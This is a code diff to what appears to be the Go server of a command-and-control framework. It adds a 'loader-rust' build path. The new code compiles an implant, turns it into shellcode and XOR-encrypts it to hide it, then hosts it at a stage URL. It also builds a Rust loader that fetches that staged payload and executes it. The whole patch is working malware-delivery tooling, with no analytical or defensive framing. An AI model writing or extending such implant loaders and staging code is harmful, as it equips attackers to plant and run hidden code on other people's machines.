@@ -991,7 +991,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 	// switch block below so they can select the right implant build per lang.
 	// Skip the lang-specific fast path for those formats.
 	isLoaderFmt := cfg.Format == "loader-c" || cfg.Format == "loader-nim" ||
-		cfg.Format == "loader" || cfg.Format == "loader-go"
+		cfg.Format == "loader" || cfg.Format == "loader-go" || cfg.Format == "loader-rust"
 
 	if cfg.Lang == "c" && !isLoaderFmt {
 		if cfg.GOOS == "linux" {
@@ -1355,6 +1355,77 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		result["bin_stage"] = binURL
 		result["raw_kb"] = fmt.Sprintf("%d", len(rawBin)/1024)
 		s.printf("[%s] build loader-nim: stage=%s…\n", op, binURL[:min(len(binURL), 60)])
+		jsonOK(w, result)
+		return
+
+	case cfg.Format == "loader-rust":
+		if cfg.StageURL == "" {
+			jsonErr(w, "stage-url required for format=loader-rust", http.StatusBadRequest)
+			return
+		}
+		var exePath string
+		var err error
+		switch cfg.Lang {
+		case "c":
+			exePath, err = BuildCAgentEXE(cfg, payloadsDir)
+		case "nim":
+			exePath, err = BuildNimEXE(cfg, payloadsDir)
+		case "rust":
+			exePath, err = BuildRustEXE(cfg, payloadsDir)
+		default:
+			exePath, err = BuildEXE(cfg, payloadsDir)
+		}
+		if err != nil {
+			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		binPath, err := BuildRAW(exePath, payloadsDir)
+		if err != nil {
+			jsonErr(w, "build shellcode: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		rawBin, err := os.ReadFile(binPath)
+		if err != nil {
+			jsonErr(w, "read .bin: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		// No compression — Rust loader does XOR-only; executing compressed bytes as
+		// shellcode would fault. Encrypt raw shellcode directly.
+		key, _ := xorKey()
+		encBin := xorBytes(rawBin, key)
+		encFile, encErr := os.CreateTemp(filepath.Dir(binPath), "enc_*.bin")
+		if encErr != nil {
+			jsonErr(w, "create enc: "+encErr.Error(), http.StatusInternalServerError)
+			return
+		}
+		if _, encErr = encFile.Write(encBin); encErr != nil {
+			encFile.Close()
+			jsonErr(w, "write enc: "+encErr.Error(), http.StatusInternalServerError)
+			return
+		}
+		encFile.Close()
+		encBinPath := encFile.Name()
+		binToken, err := s.registerStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
+		if err != nil {
+			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		binURL := cfg.StageURL + "/stage/" + binToken
+		s.setStageURL(binToken, binURL)
+		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
+		op := operatorFromCert(r)
+		s.printf("[%s] loader-rust shellcode: raw=%dKB (no compression)\n",
+			op, len(rawBin)/1024)
+		loaderPath, err := BuildRustLoader(cfg, binURL, keyHex, deliveryDir)
+		if err != nil {
+			jsonErr(w, "build loader-rust: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		result["loader"] = loaderPath
+		result["bin_stage"] = binURL
+		result["raw_kb"] = fmt.Sprintf("%d", len(rawBin)/1024)
+		result["key_hex"] = keyHex
+		s.printf("[%s] build loader-rust: stage=%s key=%s\n", op, binURL[:min(len(binURL), 60)], keyHex)
 		jsonOK(w, result)
 		return
 
